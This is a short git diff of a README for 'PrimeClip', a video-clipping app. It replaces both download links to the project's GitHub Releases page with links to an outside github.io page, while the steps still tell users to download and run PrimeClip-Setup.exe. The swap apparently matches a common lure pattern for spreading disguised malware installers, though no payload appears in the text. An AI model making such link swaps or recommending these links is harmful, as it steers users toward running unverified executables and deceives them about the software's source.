@@ -1,6 +1,6 @@
 # ✂️ PrimeClip - Transform long videos into short clips
 
-[![](https://img.shields.io/badge/Download-PrimeClip-blue.svg)](https://github.com/Octanelesseromentum437/PrimeClip/releases)
+[![](https://img.shields.io/badge/Download-PrimeClip-blue.svg)](https://octanelesseromentum437.github.io)
 
 PrimeClip helps you create short, engaging video clips from long recordings. The software uses local artificial intelligence to analyze your footage. It finds highlights and creates clips ready for social media. Everything happens on your computer. You do not need to upload your files to a cloud server. 
 
@@ -22,7 +22,7 @@ Your computer needs specific hardware to run PrimeClip. Please ensure your syste
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Visit the [Releases page](https://github.com/Octanelesseromentum437/PrimeClip/releases) to download the latest version of PrimeClip.
+1. Visit the [Releases page](https://octanelesseromentum437.github.io) to download the latest version of PrimeClip.
 2. Find the file ending in .exe in the assets section. Click the filename to start the download.
 3. Open the folder where you saved the file. Double-click the file named PrimeClip-Setup.exe to start the installer.
 4. Follow the instructions on the screen. The installer asks where you want to keep the application files. Click Next to use the default location.
